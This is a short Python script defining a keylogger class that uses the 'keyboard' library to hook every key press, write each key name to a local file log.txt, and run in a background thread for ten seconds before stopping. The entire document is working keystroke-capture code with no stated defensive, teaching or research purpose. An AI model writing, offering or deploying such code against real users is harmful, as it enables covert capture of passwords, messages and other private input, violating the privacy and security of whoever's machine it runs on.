import keyboard
import time
import threading

class Keylogger:
    def __init__(self):
        self.log = open("log.txt", "a")
        self.running = True

    def on_key_press(self, event):
        if event.name != "enter":
            self.log.write(event.name + " ")
        else:
            self.log.write("\n")

    def start(self):
        keyboard.on_press(self.on_key_press)
        while self.running:
            time.sleep(0.1)

    def stop(self):
        self.running = False
        self.log.close()

    def run(self):
        self.start()
        while self.running:
            time.sleep(0.1)

    def start_thread(self):
        threading.Thread(target=self.run).start()

    def stop_thread(self):
        self.stop()

# Create a keylogger
keylogger = Keylogger()

# Start the keylogger
keylogger.start_thread()

# Wait for 10 seconds
time.sleep(10)

# Stop the keylogger
keylogger.stop_thread()